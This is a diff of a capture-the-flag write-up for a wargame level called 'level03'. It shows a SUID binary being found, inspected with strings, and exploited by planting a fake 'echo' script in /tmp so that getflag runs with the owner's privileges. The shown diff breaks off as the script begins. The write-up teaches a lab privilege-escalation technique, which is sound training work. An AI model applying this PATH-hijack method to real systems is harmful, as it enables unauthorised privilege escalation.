@@ -1,17 +1,25 @@
 # Level03
 ## Step by step
-- In the user `level03` home directory, there is a file
+### 1. Locate the executable in `level03` home directory
   ```bash
   > ls -la
   -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
   ```
-- The file `level03` is an executable with `s` permission, that means, that the program will be run by the owner of the file, in this case `flag03`
-- When we execute the binary it print something
+
+The `level03` file is an executable with the **SUID** bit set, meaning it will execute with the privileges of its owner (`flag03`).
+
+---
+
+### 2. Execute the binary
+Running the binary gives the following output:
   ```bash
   > ./level03
    Exploit me
   ```
-- With the command `strings` we can get all the printable characters sequences that are at least 4 characters long
+---
+
+### 3. Analyze the binary with `strings`
+The `strings` command reveals printable character sequences in the binary:
   ```bash
   > strings level03
   /lib/ld-linux.so.2
@@ -38,7 +46,12 @@
   level03.c
   ...
   ```
-- The binary use `echo` to print `Exploit me`, but we can change the binary it use to execute `getflag` as the `flag03` user
+From this, we observe the binary uses `/usr/bin/env echo` to print the message "Exploit me."
+
+---
+
+### 4. Exploit the binary by replacing `echo`
+To exploit this, we create a custom `echo` script that runs the `getflag` command:
   ```bash
   >  cat <<hey >/tmp/echo
   > #!/bin/bash
